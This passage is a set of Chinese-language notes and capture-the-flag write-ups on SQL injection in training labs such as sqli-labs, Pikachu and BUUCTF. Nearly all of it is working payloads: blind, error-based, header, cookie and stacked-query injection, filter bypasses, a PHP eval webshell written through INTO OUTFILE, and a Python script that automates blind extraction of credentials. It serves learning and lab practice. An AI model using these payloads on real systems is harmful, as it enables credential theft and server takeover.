?name=kobe' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,2)='ht'--+
//直接字符找到
```

**猜列名**

```
?name=kobe' and substr((select group_concat(column_name) from information_schema.columns where table_name='member' limit 0,1),4,1)='u'--+
//判断得到列名,建议直接用这种方法，因为可能会遇到null
```

**猜值**

```
?name=kobe' or ascii(substr((select group_concat(username,":",password) from users),1,1))=93--+
//通过ASCII码大小判断得到数据

?name=kobe' or substr((select group_concat(username,":",password) from users),1,1)=']'--+
//判断得到数据
```



### 盲注(base on time)

#### 考点：类似于上一题，学会判断注入

#### 思考

**猜库名长度**

```
?name=kobe' and if(length(database())>1,sleep(3),1) --+

?name=kobe' and if(length(database())=7,sleep(3),1) --+
最后用“=”试出来库名为7位
```

**猜库名**

```
?name=kobe' and if(ascii(substr(database(),1,1))=112,sleep(3),1)--+
//判断得到库名是pikachu
```

**猜表名**

```
?name=kobe' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<120,sleep(3),1) --+

?name=kobe' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,2)='ht',sleep(3),1) --+
//最后一步一步判断表名
```

**猜列名**

```
?name=kobe' and if(substr((select group_concat(column_name) from information_schema.columns where table_name='member' limit 0,1),4,1)='u',sleep(3),1)--+
//判断得到列名,建议直接用这种方法，因为可能会遇到null
```

**猜值**

```
?name=kobe' or if(ascii(substr((select group_concat(username,":",password) from users),1,1))=97,sleep(3),1)--+
//通过ASCII码大小判断得到数据

?name=kobe' or if(substr((select group_concat(username,":",password) from users),1,1)='a',sleep(3),1)--+
//判断得到数据
```



### 宽字节注入

#### 考点：

注意这里的引号需要绕过

#### 思考

```
1%df%5c%27 union select 1,database()%23
%df%5c' union select 1,database()%23	
```

```
1%df%5c%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23
```

```
1%df%5c%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273(这里为users的16进制表示)%23
```

```
1%df%5c%27 union select 1,group_concat(username,0x3b,password) from users --+
```





## sqli-labs

### less-1

#### 考点：

`?id=1' --+`，没有报错，判断数显位数后，直接注入

#### 思路：

**payload**

```
?id=0' order by 3 --+	//一共3位
?id=0' union select 1,2,3 --+	//共3位，数显位2，3位

?id=0' union select 1,2,database() --+	//库名为：security

?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" --+
//表名有：emails,referers,uagents,users

?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"--+
//列名有：id,username,password,level,id,username,password

?id=0' union select 1,2,group_concat(username,':',password) from users--+
//数据：
```



### less-2

#### 考点：闭合方式

#### 思路：

数字型，

**payload**

```
?id=0 union select 1,2,3 --+	//3位，数显2，3位，具体payload与第1题一样
```



### less-3

#### 考点：判断闭合方式

#### 思路：

**payload**

```
?id=0') or 1=1 --+		//成功注入，payload类似于第1题
```



### less-4

#### 考点：判断闭合方式

#### 思路：

**payload**

```
?id=0") or 1=1 --+		//成功注入，payload类似于第1题
```



### less-5

#### 考点：报错注入

#### 思路：

`?id=1`时，有报错信息，所以直接选用报错注入

floor由于报错

**payload**

```
?id=0' or updatexml(1, concat('~',database()), 1)--+	//爆库名
?id=0' or updatexml(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'), 1) --+	//爆表名，updatexml方法

?id=-1'union select count(*),1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+	//爆表名，floor报错方法，输出更多

?id=-1'union select count(*),1, concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+	//爆列名，使用floor报错

?id=-1'union select count(*),1, concat('~',(select username from users limit 1,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
//这里要一个一个输出 “limit 1,1”，只需改变第一个值
```



### less-6

#### 考点：报错注入

#### 思路：and

与5题一样，改成双引号就好了

**payload**

```
?id=1" and 1=1--+
```



### less-7

#### 考点：

#### 思路：

写入一句话木马

**payload**

```
?id=1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "路径\\间隔"--+
```



### less-8

#### 考点：基于布尔的盲注

#### 思路：

判断后为单引号闭合（`?id=1' and 1=1--+`正常，`?id=1' and 1=2--+`报错）

**payload**

```
?id=1' and ascii(substr(database(),1,1))=115--+		//猜库名

?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<120--+		//猜表名

?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_name='member' limit 0,1),4,1)='u'--+		//猜列名，直接猜字符串

?id=1' or substr((select group_concat(username,":",password) from users),1,1)=']'--+
//猜数据
```



### less-9

#### 考点：基于时间的盲注

#### 思路：

无论怎么输入，都没反应，判断为盲注，于是用`?id=1' and sleep(3)--+`结果延时输出，ok

**payload**

```
?id=1' and if(length(database())>1,sleep(3),1) --+	//猜库名长度

?id=1' and if(ascii(substr(database(),1,1))=112,sleep(3),1)--+ //猜库名


?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<120,sleep(3),1) --+	//猜表名长度

?id=1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,2)='ht',sleep(3),1) --+		//猜表名

?id=1' and if(substr((select group_concat(column_name) from information_schema.columns where table_name='member' limit 0,1),4,1)='u',sleep(3),1)--+		//猜列名

?id=1' or if(ascii(substr((select group_concat(username,":",password) from users),1,1))=97,sleep(3),1)--+
//通过ASCII码大小判断得到数据

?id=1' or if(substr((select group_concat(username,":",password) from users),1,1)='a',sleep(3),1)--+
//判断得到数据
```



### less-10

#### 考点：基于时间的盲注

#### 思路：

于第9题一样，双引号闭合

**payload**

```
?id=1" and sleep(3)--+
```



### less-11

#### 考点：POST型，字符型注入

#### 思路：

判断闭合为单引号闭合

**payload**

```
uname=1' order by 2#&passwd=1&submit=Submit	  //判断列数

uname=1' union select 1,database()#&passwd=1&submit=Submit
//爆库名

uname=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema="security" #&passwd=1&submit=Submit		//爆表名

uname=1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users"#&passwd=1&submit=Submit		//爆列名

uname=1' union select 1,group_concat(username,':',password) from users#&passwd=1&submit=Submit		//爆数据
```



### less-12

#### 考点：POST型，字符型注入

#### 思路：

判断闭合为双引号+括号闭合，其他于11题一样

**payload**

```
uname=admin") order by 2#&passwd=1&submit=Submit
```



### less-13

#### 考点：注释+报错注入

#### 思路：

**payload**

```
uname=1') and extractvalue(1,payload)%23
&passwd=1&submit=Submit

uname=1') and extractvalue(1,concat('~',(select database())))%23
&passwd=1&submit=Submit		//爆库，其他的就是正常的报错注入了
```



### less-14

#### 考点：注释+报错注入

#### 思路：

与13题一样，只是闭合符号不一样

**payload**

```
uname=1" and extractvalue(1,payload)%23
&passwd=1&submit=Submit
```



### less-15

#### 考点：布尔/时间盲注

#### 思路：

**payload**

```
uname=1' or ascii(substr(payload,1,1))>112%23
&passwd=1&submit=Submit		//填入payload

uname=1' or ascii(substr(database(),1,1))>112%23
&passwd=1&submit=Submit		//boll型

uname=1' or if(length(database())>1,sleep(3),1)%23
&passwd=1&submit=Submit		//时间型
```



### less-16

#### 考点：布尔/时间盲注

#### 思路：

与13题一样，只是闭合符号不一样

**payload**

```
uname=1" or ascii(substr(payload,1,1))>112%23
&passwd=1&submit=Submit
```



### less-17

#### 考点：update()的报错注入

#### 思路：

**payload**

```
uname=admin&passwd=1' or updatexml(1,concat('~',payload,'~'),0) or '&submit=Submit

uname=admin&passwd=1' or updatexml(1,concat('~',database(),'~'),0) or '&submit=Submit		//爆库名

uname=admin&passwd=11' and  updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or '&submit=Submit
//爆表名

uname=admin&passwd=11' and  updatexml(1,concat(0x7e,(select (concat_ws('-',username,password)) from pikachu.users limit 0,1),0x7e),1) or '&submit=Submit	//爆值
```



### less-18

#### 考点：http头部POST注入

#### 思路：

报错型，单引号，user-agent型注入点，直接bp抓包

**payload**

```
qing' or updatexml(1,concat('~',(payload),'~'),1) or '

qing' or updatexml(1,concat('~',(database()),'~'),1) or '
```



### less-19

#### 考点：http头部POST注入

#### 思路：

单引号，报错型，referer型注入点

**payload**

```
Referer:'or updatexml(1,concat('~',(select database()),'~'),1) or '
```



### less-20

#### 考点：基于错误的cookie头部POST注入

#### 思路：

单引号，报错型，cookie型注入

```
Cookie: uname=admin' order by 3--+ //1-3 正常
Cookie: uname=admin' order by 4--+ //4 不正常 ，确定行数为3
```

**payload**

```
Cookie: uname=0' union select 1,2,database()--+	//爆库
```



### less-26

#### 考点：过滤空格/注释，报错注入

#### 思路

判断注入的类型：字符型单引号闭合

```
?id=1'		//单引号报错，双引号不报错，判断为单引号闭合。单引号时加入--+报错中未出现注释，因此--+，注释被过滤
```

有报错回显，并且过滤了大量的字符，因此选择报错注入

- 空格：%A0、括号

爆库

```
?id=0'||updatexml(1,concat('~',(database())),0)||'1'='1
```

爆表

```
?id=0'||updatexml(1,concat('~',(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),0)||'1'='1
```

爆字段

```
?id=0'||updatexml(1,concat(0x7e,(select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name = 0x7573657273) )),1)||'1'='1

?id=0'||updatexml(1,concat('~',(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema='security')%26%26(table_name='users'))),0)||'1'='1	//%26%26=&&
```

爆值

过滤了password，双写绕过。报错有字符限制也不能使用`group_concat()`

```
?id=0'||updatexml(1,concat('~',(select(concat('$',id,'$',username,'$',passwoorrd))from(users)where(username)='admin')),0)||'1'='1
```



### less-26a

#### 考点：过滤空格/注释，联合注入

因为**屏蔽了报错回显**，因此不应该使用报错注入，使用联合注入，这里用`('3`结束

- **空格：%A0、括号**
- **将information_schema替换为infoorrmation_schema**
- **将and替换为aandnd**
- **将password替换为passwoorrd**

#### 思路

爆库

```
?id=0')union%A0select%A01,database(),('3
```

爆表

```
?id=0')union%A0select%A01,(select%A0group_concat(schema_name)%A0from%A0infoorrmation_schema.schemata),('3
```

爆字段

```
?id=0')union%A0select%A01,(select%A0group_concat(table_name)%A0from%A0infoorrmation_schema.tables%A0where%A0table_schema='security'%A0),('3
```

爆值

```
?id=0')union%A0select%A01,(select%A0group_concat(username,':',passwoorrd)%A0from%A0security.users),('3
```



### less-27

#### 考点：

测试发现：字符型，单引号闭合，无括号。union select 被过滤

#### 思路

爆库

```
?id=0'%0AUNion%0ASElEct%0A1,database(),3||'1'='1
```

爆表

```
?id=0'%0AUNion%0ASElEct%0A1,(SELEct%0Atable_name%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'%0Alimit%0A0,1),3||'1'='1
```

爆字段

```
?id=0'%0AUNion%0ASElEct%0A1,(SELEct%0Acolumn_name%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name='security'%0Alimit%0A0,1),3||'1'='1
```

爆值

```
?id=0'%0AUNion%0ASElEct%0A1,(SelecT(group_concat(username,'~',password))from(users)),3||'1'='1
```



### less-27a

#### 考点：

本质上与27题一样，但我们这次采用/**/的方法绕过

%09：TAB

#### 思路

爆库

```
?id=0"/*%09*/unIon%09/*SeleCt*/%091,database(),3||"1
```

爆表

```
?id=0"/*%09*/unIon%09/*SeleCt*/%091,(SeleCt%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema='security'),3||"1
```

爆字段

```
http://127.0.0.1/sqli-labs/Less-27a/?id=0"/*%09*/unIon%09/*SeleCt*/%091,(SeleCt%09group_concat(column_name)%09from%09information_schema.columns%09where%09table_schema='security'%09and%09table_name='users'),3||"1
```

爆值

```
?id=0"/*%09*/unIon%09/*SeleCt*/%091,(SeleCt%09group_concat(username,0x7e,password)%09from%09users),3||"1
```







## sqli-labs二刷

### less 1~4

#### 类型：

**less-1~4**分别为**有回显的SQL注入**

#### 解题方法

==联合查询==

#### 输入点

```
less 1：?id=1' or 1=1 --+	//字符型
less 2：?id=1 or 1=1 --+		//数值型
less 3：?id=1') or 1=1 --+	//字符型带括号
less 4：?id=1") or 1=1 --+	//字符型带括号
```

#### 输出点

payload

```
less 1：?id=1' and 1=1 --+	?id=1' and 1=2 --+
less 2：?id=1 and 1=1 --+	?id=1 and 1=2 --+
less 3：?id=1') and 1=1 --+	?id=1') and 1=2 --+
less 4：?id=1") and 1=1 --+	?id=1") and 1=2 --+
```

构造 `and = 1=1` 和 `and 1=2` 发现页面变化输出点



#### 解题

1. 判断列数&判断回显地址

   ```
   ?id=0' order by 3 --+	//一共3位数显
   ?id=0' union select 1,2,3 --+	//判断回显地址分别为，2，3
   ```

2. 获取数据库

   ```
   ?id=0' union select 1,2,database() --+	
   ```

   库名为：security

3. 获取表

   ```
   ?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" --+
   ```

   表名有：emails,referers,uagents,users

4. 获取字段

   ```
   ?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users"--+
   ```

   字段有：id,username,password,level,id,username,password

5. 取值

   ```
   ?id=0' union select 1,2,group_concat(username,':',password) from users--+
   ```



### less 5-6

#### 类型：

**less-5~6**分别为**有==报错==回显的SQL注入**

#### 解题方法

==报错注入==

常用有3种，报错注入共**有9种**，分别是：

1. **floor()和rand()**

   floor(x)，也写做Floor(x)，其功能是“向下取整”，或者说“向下舍入”即取不大于x的最大整数

   rand函数不是真正的随机数生成器，而srand()会设置供rand()使用的随机数种子。如果你在第一次调用rand()之前没有调用srand()，那么系统会为你自动调用srand()。而使用同种子相同的数调用 rand()会导致相同的随机数序列被生成

   **条件：**floor(rand(0)*2)报错是有条件的，**记录必须3条以上**，而且在3条以上必定报错

   **能查询字符串的最大长度为64个字符**

   ```
   union select count(*),2,concat('~',(select database()),'~',floor(rand()*2))as a from information_schema.tables group by a --+
   ```

   [floor()函数报错分析](https://blog.csdn.net/cried_cat/article/details/80022378)

2. **extractvalue() & updatexml()**

   updatexml()函数与extractvalue()类似，是更新xml文档的函数

   **语法：**updatexml(目标xml文档，xml路径，更新的内容)

   ​			extractvalue(目标xml文档，xml路径)

   **能查询字符串的最大长度都只为32位**，如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位

   ```
   ?id=0' and updatexml(1, concat('~',user(),'~'), 3) --+
   
   ?id=0' and (extractvalue(1,concat('~',user(),'~'))) --+
   ```

3. **geometrycollection()**

   GeometryCollection()是由1个或多个任意类几何对象构成的几何对象，所有元素必须具有相同的空间参考系（即相同的坐标系）

   但是还是没怎么看懂怎么报的错

   ```
   id=1 and geometrycollection((select * from(select * from(select user())a)b))
   ```

4. **multipoint()**

   MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序

   这个我也是看的云里雾里，感觉和geometrycollection()是同一种套路

   ```
   id=1 and multipoint((select * from(select * from(select user())a)b))
   ```

5. **polygon()**

   Polygon() 这也是和空间几何有关的，这三兄弟是一个套路，都是需要数字就大概会报错

   ```
   id=1 and polygon((select * from(select * from(select user())a)b))
   ```

6. **multipolygon()**

   不说了，一个套路，multipolygon()是一种由Polygon元素构成的几何对象集合，为了显错传入字符串,所以报错

   ```
   id=1 and multipolygon((select * from(select * from(select user())a)b))
   ```

7. **linestring()**

   LineString()是具有点之间线性内插特性的Curve，为了显错传入了,字符串....

   ```
   id=1 and linestring((select * from(select * from(select user())a)b))
   ```

8. **multilinestring()**

   multilinestring()是一种由LineStirng元素构成的MultiCurve几何对象集合，为了显错又把字符串传进去了

   ```
   id=1 and multilinestring((select * from(select * from(select user())a)b))
   ```

9. **exp()**

   EXP(x)函数计算e的x次方，即ex

   EXP()肯定是需要数字的,传入个字符串必然显错。

   ```
   id=1 and exp(~(select * from(select user())a))
   ```



#### 解题

1. **获取数据库**

   **updatexml & extractvalue()方法：**

   ```
   ?id=0' and updatexml(1, concat('~',database(),'~'), 1) --+
   
   ?id=0' and extractvalue(1,concat('~',database(),'~')) --+
   ```

   **floor报错方法：**

   ```
   ?id=-1' union select count(*),2,concat('~',(select database()),'~',floor(rand()*2))as a from information_schema.tables group by a --+
   ```

   库名为：security

2. **获取表**

   **updatexml & extractvalue()方法：**

   ```
   ?id=0' and updatexml(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'), 1) --+
   
   ?id=0' and extractvalue(1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~')) --+
   ```

   **floor报错方法：**

   ```
   ?id=-1'union select count(*),1, concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
   ```

   表名有：emails,referers,uagents,users

3. **获取字段**

   **updatexml & extractvalue()方法：**

   ```
   ?id=0' and updatexml(1, concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~'), 1) --+
   
   ?id=0' and extractvalue(1, concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~')) --+
   ```

   **floor报错方法：**

   ```
   ?id=-1'union select count(*),1, concat('~',(select group_concat(column_name) from information_schema.columns where table_name='users'),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
   ```

   字段有：id,username,password,level,id,username,password

4. **取值**

   **updatexml & extractvalue()方法：**

   ```
   ?id=0' and updatexml(1, concat('~',(select group_concat(username,':',password) from users),'~'), 1) --+
   
   ?id=0' and extractvalue(1, concat('~',(select group_concat(username,':',password) from users),'~')) --+
   
   ?id=0' and extractvalue(1, concat('~',(select substring(group_concat(username,':',password),10) from users),'~')) --+	//从第10个字符开始，之后的所有个字符,一次输出最多32个字符
   
   
   ?id=0' and extractvalue(1, concat('~',(select username from users limit 1,1),(select password from users limit 1,1),'~')) --+	//一个一个更改limit的第一个值，两个一起
   ```

   **floor报错方法：**

   ```
   ?id=-1'union select count(*),1, concat('~',(select username from users limit 1,1),'~',floor(rand(0)*2)) as a from information_schema.tables group by a--+
   ```

   这里要一个一个输出结果， “limit 1,1”，只需改变第一个值





### less 7

#### 类型：

字符型注入&上传木马

#### 解题方法

file上传一句话木马  

#### 解题

1. **判断注入形式**

   ```
   ?id=1		//正常
   ?id=1'		//报错
   ?id=1"		//正常
   基本判断为单引号字符型注入
   ```

   ![07-1](images/sqli_labs/07-1.png)

   **注意：**这里要强调一下，一般在**SQL查询语句中**，**单双引号不能同时存在**。即数字型/字符型及单/双引号注入能在这三条语句返回的结果判断出来

2. **分析是否存在括号及个数**
   
   ```
   ?id=1' and 1=1 --+	//将查询语句后半段注释掉发现仍报错，说明有括号
   
   ?id=1')) and 1=1 --+	//依次增加括号个数，直到回显正常，这就找到了注入点
   ```
   
3. **确认列数，注入PHP一句话木马**

   ```
   ?id=1')) order by 3--+
   
   ?id=1')) union select 1,2,'<?php @eval($_POST["x"]);?>' into outfile "路径\\间隔"--+
   ```

   注意下这里的路径必须用 \\\，需要转义一下

   最后我这边环境的路径为

   ```
   ?id=1')) union select 1,2,'<?php @eval($_POST["x"]);?>' into outfile "D:\\Software\\phpstudy_pro\\WWW\\antlers\\Sqli_Edited_Version-master\\webshell.php""--+
   ```

   最后蚁剑连一下

**PS：**

> 这里有个坑，这个方法需要mysql数据库开启secure-file-priv写文件权限，否则不能写入文件。
>
> 
>
> 如果使用的时phpstudy，需要修改其自己的环境里的mysql配置文件。
>
> - 进入mysql安装目录，找到my.ini 修改里面的secure-file-priv参数
>
> - 如果发现没有secure_file_priv这个选项，直接再最后添加一个空的即可。
>
> - ```
>   secure-file-priv = ""
>   ```



### less 8

#### 类型：

基于布尔的盲注

#### 解题方法

盲注

#### 盲注的类型有哪些

1. 基于时间的盲注

   基于时间？其实就是也有点是需要结合布尔的，我注入SQL去一个一个猜测字符串的值，如果是对，延迟几秒再显示页面，如果是错，就正常显示页面

   ```
   if(ascii(substr(database(),1,1))>115,sleep(5),0) --+	//如果条件为真，执行 sleep
   ```

   

2. 基于布尔的盲注

   基于布尔？其实跟时间很像，只不过做判断的不再是时间，而是返回的数据本身，比如，我查ABC这一数据，问第一个字母的 ASCII 值是不是大于 100 ，如果正确，页面就会显示 you are in…，如果错误就什么都不显示

   ```
   left(database(),1)>'s'		//database():显示数据库名称 left(a,b) 从左侧截取 a 的前 b 位
   
   ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+		//substr(a,b,c)：从 b 位置开始截取 a 字符串的 c 长度，ascii()：将某个字符串转化为 ascii 值
   
   ord(mid((select IFNULL(CAST(usernames as char),0x20)from security.users order by id limit 0,1),1,1))>98 --+			//ord():同substr()，mid()：同ascii()
   ```

   

3. 基于报错的盲注

   基于报错有点类似报错注入，通过一些函数特性报错得到需要的结果

   ```
   select count(*) from information_schema.tables group by concat((select database()),floor(rand()*2))		//基础的报错盲注
   
   select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand()*2))	//适用于：information_schema.tables表被禁用了
   
   select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2)		//适用于：rand被禁用了，于是可以使用用户变量来报错
   ```



#### 解题

1. **判断注入形式**

   ```
   ?id=1		//正常
   ?id=1'		//报错
   ?id=1"		//正常
   基本判断为单引号字符型注入
   ```

2. **分析是否存在括号及个数**

   ```
   ?id=1' and 1=1 --+		//正常，确认无括号
   ?id=1' and 1=2 --+		//报错
   ```

3. **由于没有有效回显，所以确认为单引号布尔盲注**

   首先就先判断一下数据库的长度

   ```
   ?id=1' and (select length(database()))>7 --+	//最后得到长度为8
   ```

4. **获得数据库**

   ```
   ?id=1' and ascii(substr(database(),1,1))>97--+	//猜表名第一个字符是否大于a，substr截取字符串第一个参数要截取的字符串，第二个参数起始位，第三个参数偏移量
   ```

5. **获取表**

   ```
   ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<120--+		//猜表名
   ```

6. **获取列名**

   ```
   ?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_name='member' limit 0,1),4,1)='u' --+	//猜列名，这里我们换一种方式，直接猜字符串
   ```

7. **取值**

   ```
   ?id=1' and substr((select group_concat(username,":",password) from users),1,1)='s'--+	//猜数据
   ```



手工盲注太麻烦了，我们写一个python脚本跑一下

```python
import requests


def select(data):
    if data == 'database':
        # length = 8
        database = 'select database()'
        select_database = "(select length(database()))"
        return database, select_database

    if data == 'tables':
        # length = 29
        tables = "select group_concat(table_name) " \
                 "from information_schema.tables " \
                 "where table_schema='security'"
        select_tables = "(select length(group_concat(table_name)) " \
                        "from information_schema.tables " \
                        "where table_schema='security')"
        return tables, select_tables

    if data == 'column':
        # length = 20
        column = "select group_concat(column_name) " \
                 "from information_schema.columns " \
                 "where table_schema=database() " \
                 "and table_name='users'"
        select_column = "(select length(group_concat(table_name)) " \
                        "from information_schema.tables " \
                        "where table_schema='security')"

        return column, select_column


def length(data_select, url):
    url = url + "and"
    
    # 二分法：
    # min = 0
    # max = 127
    # while True:
    #     if (max - min) > 1:
    #         mid = int((min + max) / 2)
    #     else:
    #         mid = max
    #         break
    #     payload = url + data_select + "={} %23".format(i)
    #     re = requests.get(payload)
    #     if 'You are in' in re.text:
    #         min = mid
    #     else:
    #         max = mid
    # print('它的长度为：', i)
    # return mid
	
    # 直接循环猜
    for i in range(30):
        payload = url + data_select + "={} %23".format(i)
        re = requests.get(payload)
        if 'You are in' in re.text:
            print('它的长度为：', i)
            return i


if __name__ == '__main__':
    data = input('请输入你需要查找什么(database，tables，column)：')
    url = input("请先判断注入类型，再输入盲注地址：")
    # url = 'http://127.0.0.1/Sqli_Edited_Version-master/Less-8/?id=1''

    query1, query2 = select(data)
    dataLength = length(query2, url)
    result = ''

    print('开始盲注！')
    for i in range(1, 100):
        for j in range(65, 123):
            payload = "and ascii(substr((" + query1 + "),{},1))={} %23".format(i, j)
            r = requests.get(url + payload)
            if 'You are in' in r.text:
                result += chr(j)
                print(result)
                break
    print('程序执行结束，最终爆出：', result)
```



### less 9~10

#### 类型：

基于时间的盲注

#### 解题方法

盲注



#### 解题

以第9题为例，第10题为双引号

1. **判断注入形式**

   ```
   ?id=1		//正常
   ?id=1'		//正常
   ?id=1"		//正常
   emmmm，只能添加sleep进行观察
   
   ?id=1 and sleep(3) --+		
   ?id=1' and sleep(3) --+		//通过
   ?id=1" and sleep(3) --+
   ```

2. **确认为单引号时间盲注**

   首先就先判断一下数据库的长度

   ```
   ?id=1' and if(length(database())>5,sleep(3),1) --+	//最后得到长度为8
   ```

3. **获得数据库**

   ```
   ?id=1' and if(ascii(substr(database(),1,1))>97,sleep(3),1)--+	//猜表名第一个字符是否大于a，substr截取字符串第一个参数要截取的字符串，第二个参数起始位，第三个参数偏移量
   ```

4. **获取表**

   ```
   ?id=1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,2)='ht',sleep(3),1) --+ 		//猜表名
   ```

5. **获取列名**

   ```
   ?id=1' and substr((select group_concat(column_name) from information_schema.columns where table_name='member' limit 0,1),4,1)='u' --+	//猜列名
   ```

6. **取值**

   ```
   ?id=1' or if(ascii(substr((select group_concat(username,":",password) from users),1,1))=97,sleep(3),1)--+	//猜字符串
   
   ?id=1' or if(ascii(substr((select group_concat(username,":",password) from users),1,1))=97,sleep(3),1)--+	//通过ASCII码猜
   ```



### less11~12

#### 类型：

POST 基于错误 字符型注入

#### 解题方法

通过登录框进行注入

以第11题为例，12题为双引号+括号的闭合



#### 解题

1. **随便输点东西**

   ![11-1](images/sqli_labs/11-1.png)

   没反应，再输！！！

   ![11-2](images/sqli_labs/11-2.png)

   回显是一个报错信息，再加一个双引号

   ![11-3](images/sqli_labs/11-3.png)

   最后我们推出这个页面的SQL语句

   ```
   select username,password from users where username='用户名' and password='密码' limit 0,1
   ```

2. 我们直接构建自己的payload，并换POST进行传参，**爆库名**

   ```
   uname=1' union select 1,database() #&passwd=xwx & submit=Submit
   ```

3. **获取表名**

   ```
   uname=1' union select 1,group_concat(table_name) from information_schema.tables where table_schema="security" #&passwd=xwx & submit=Submit
   ```

4. **获取字段**

   ```
   uname=1' union select 1,group_concat(column_name) from information_schema.columns where table_name="users" #&passwd=xwx & submit=Submit
   ```

5. **取值**

   ```
   uname=1' union select 1,group_concat(username,':',password) from users #&passwd=xwx & submit=Submit
   ```



### less13

#### 类型：

POST 单引号加括号 字符型 报错注入

#### 解题方法

通过登录框进行注入

以第11题为例，12题为双引号+括号的闭合



#### 解题

1. 同样的，我们直接单引号＋双引号让他直接报错，我们就知道查询语句了

   ![13-1](images/sqli_labs/13-1.png)

   最后我们推出这个页面的SQL语句

   ```
   select username,password from users where username=('账号') and password=('密码') limit 0,1 
   ```



2. 一样的，POST进行传参**爆库名**

  ```
  //报错注入，之updatexml
  uname= 1') and updatexml(1, concat('~',database(),'~'), 1) # &passwd=xwx') #&submit=Submi
  
  //报错注入，之extractvalue
  uname=1') and extractvalue(1,concat('~',database(),'~')) #&passwd=1&submit=Submit
  
  //报错注入，之floor
  uname= 1') union select count(*),concat('~',(select database()),'~',floor(rand()*2)) as a from information_schema.tables group by a # &passwd= ') or 1=1 # &submit=Submi
  ```

3. **获取表名&获取字段&取值**

   都是一样的报错注入了

   









## BUUCTF

### [强网杯 2019]随便注（堆叠注入）

确定类型为字符型注入，单引号闭合

```
?inject=1' order by 2%23	//数显为2位
```

进行联合查询

```
?inject=1' union select 1,2		//返回正则匹配，发现过滤的许多关键字
```

直接进行注入

```
?inject=1';show databases%23	//注入成功，进行查表
```

爆表

```
?inject=1';show tables%23		//发现有两张表，分别进行查询
```

查字段

```
?inject=1';show columns from `1919810931114514`--+	//纯数字的表需要用反引号进行标注才能查询到，并且flag就在这张表中
```



因此，现在需要解决如何查询到这张表，因为默认查询的是“words”这张表

#### 方法一：特殊的查看方式

用**handler**方法，查询表中内容，[handler介绍](https://www.cnblogs.com/zengkefu/p/5684642.html)

```
?inject=1'; handler `1919810931114514` open;handler`1919810931114514` read first;
//打开这个表（纯数字的表需要用反引号选择中），读取第一段
```

#### 方法二：预处理，存储绕过

[mysql中Prepare、execute、deallocate的使用方法](https://blog.csdn.net/weixin_37839711/article/details/81562550)

```
?inject=1';SeT@a=0x73656c656374202a2066726f6d206031393139383139333131313435313460;prepar antlers_sql from @a;execute antlers_sql;%23

//定义一个变量@a，16进制（内容为：select * from `191981931114514`），分配给这个SQL语句一个名字（这里为antlers_sql）并且传入@a的内容（也即我们的payload），execute（执行）这条命令！
//SeT大小写绕过
```

#### 方法三：替换默认表

1. 将words表改名为word1或其它任意名字
2. 1919810931114514改名为words
3. 将flag列改名为id

```
?inject=1';rename table `words` to `word1`;rename table `1919810931114514` to `words`;alter table `words`change `flag``id`varchar(100)character set utf8 collate utf8_general_ci not null;--+

接着我们再用0’ or '1'='1 #,查询就得到flag
```



### [SUCTF 2019]EasySQL

#### 考点：堆叠注入

查询源码后看到查询语句，[源码查询](https://www.jianshu.com/p/5644f7c39c68)

```mysql
$sql = "select ".$post['query']."||flag from Flag";
mysqli_multi_query($MysqlLink,$sql);
	do{
    	if($res = mysqli_store_result($MysqlLink)){
        	while($row = mysqli_fetch_row($res)){
            	print_r($row);
            }
       }
```

#### 思路

看到mysql_multi_query()，可以堆叠注入



#### 方法一：预期解

通过堆叠注入**sql_mode**的值为**PIPES_AS_CONCAT**，设置sql_mode为PIPES_AS_CONCAT后**可改变'||'的含义为连接字符串**

```
1;set sql_mode=PIPES_AS_CONCAT;select 1		//可以看到flag
```

#### 方法二：意外解

由于没有过滤 * 出现了一个意外解

```
*,1 
```



### [极客大挑战 2019]EasySQL

#### 考点：万能密码

